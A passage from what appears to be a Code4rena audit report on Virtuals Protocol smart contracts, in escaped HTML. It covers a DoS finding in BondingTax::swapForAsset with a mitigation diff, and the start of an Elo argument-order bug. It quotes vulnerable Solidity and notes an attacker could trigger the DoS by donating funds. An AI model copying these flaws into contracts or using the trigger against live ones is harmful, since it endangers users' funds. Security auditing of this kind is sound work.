class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etaxToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Nothing to be swapped\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);       \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Reverts if balance is 0\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminSwapThreshold\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk4\"\u003efalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emaxSwapThreshold\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emaxSwapThreshold\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHence, if buy and/or sell tax is set to 0 via \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/fun/FFactory.sol#L74\"\u003e\u003ccode\u003eFFactory::setTaxParams\u003c/code\u003e\u003c/a\u003e, there can be a case where the balance of \u003ccode\u003etaxManager\u003c/code\u003e becomes 0. \u003c/p\u003e\n\u003cp\u003eAlso this is not unlikely, and can be very easily manipulated by an attacker by simply donating exactly to match \u003ccode\u003emaxSwapThreshold\u003c/code\u003e funds. Setting fees to 0 is a very valid and intuitive value to set.\u003c/p\u003e\n\u003ch3 id=\"impact-13\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-13\" aria-label=\"impact 13 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eFailed buy and sell swaps will lead to DoS.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-19\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-19\" aria-label=\"recommended mitigation steps 19 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eIt is recommended to simply return with \u003ccode\u003e(false, 0)\u003c/code\u003e instead of reverting:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"92\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    // BondingTax.sol\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    function swapForAsset() public onlyBondingRouter returns (bool, uint256) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256 amount = IERC20(taxToken).balanceOf(address(this));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e-        require(amount \u0026gt; 0, \u0026quot;Nothing to be swapped\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e-        if (amount \u0026lt; minSwapThreshold) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+        if (amount \u0026lt; minSwapThreshold || amount == 0) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            return (false, 0);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        if (amount \u0026gt; maxSwapThreshold) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            amount = maxSwapThreshold;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-16-elo-calculation-error\" style=\"position:relative;\"\u003e\u003ca href=\"#m-16-elo-calculation-error\" aria-label=\"m 16 elo calculation error permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-71\"\u003e[M-16] \u003ccode\u003eElo\u003c/code\u003e calculation error\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-447\"\u003elevi_104\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-809\"\u003eaxelot\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-13\"\u003egmh5225\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-382\"\u003eio10\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/EloCalculator.sol#L39-L55\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/EloCalculator.sol#L39-L55\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-3\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-3\" aria-label=\"finding description and impact 3 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eHere, the order of \u003ccode\u003eeloB\u003c/code\u003e and \u003ccode\u003eeloA\u003c/code\u003e is reversed, and subsequently, \u003ccode\u003eeloA\u003c/code\u003e and \u003ccode\u003eeloB\u003c/code\u003e are calculated with addition and subtraction based on the value of \u003ccode\u003enegative\u003c/code\u003e, leading to a final calculation error.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"93\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebattleElo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentRating\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebattles\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebattles\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eresult\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emapBattleResultToGameResult\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebattles\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003echange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enegative\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eElo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eratingChange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eresult\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ek\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003echange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_roundUp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003echange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enegative\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e -= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003echange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e += \u003c/span\u003e\u003cspan class=\"mtk12\"\u003echange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e += \u003c/span\u003e\u003cspan class=\"mtk12\"\u003echange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e -= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003echange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentRating\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIn the ELO system:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eratingA\u003c/code\u003e usually represents Player A’s rating, and score is Player A’s score.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eratingB\u003c/code\u003e is the opponent (Player B)’s rating.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eBut in this code:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eeloA\u003c/code\u003e is regarded as Player A’s rating.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eeloB\u003c/code\u003e is regarded as Player B’s rating.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eHowever, when calling \u003ccode\u003eElo.ratingChange(eloB, eloA, result, k)\u003c/code\u003e, it means:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eratingA = eloB\u003c/code\u003e (Player B’s rating).\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eratingB = eloA\u003c/code\u003e (Player A’s rating).\u003c/li\u003e\n\u003cli\u003escore is the score of \u003ccode\u003eratingA\u003c/code\u003e (\u003ccode\u003eeloB\u003c/code\u003e).\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThis is unexpected. Usually, \u003ccode\u003eElo.ratingChange(eloA, eloB, result, k)\u003c/code\u003e should be used, because:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eeloA\u003c/code\u003e is Player A’s rating, and result is Player A’s battle outcome.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eeloB\u003c/code\u003e is Player B’s rating.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eDue to the wrong parameter order, \u003ccode\u003eElo.ratingChange\u003c/code\u003e calculates the change and direction of \u003ccode\u003eeloB\u003c/code\u003e (as \u003ccode\u003eratingA\u003c/code\u003e), not of \u003ccode\u003eeloA\u003c/code\u003e.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"94\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/// @notice Calculates the change in ELO rating, after a given outcome.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/// @param ratingA the ELO rating of the player A\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/// @param ratingB the ELO rating of the player B\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/// @param score the score of the player A, scaled by 100. 100 = win, 50 = draw, 0 = loss\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/// @param kFactor the k-factor or development multiplier used to calculate the change in ELO rating. 20 is the typical value\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/// @return change the change in ELO rating of player A, with 2 decimals of precision. 1501 = 15.01 ELO change\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/// @return negative the directional change of player A\u0026#39;s ELO. Opposite sign for player B\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan 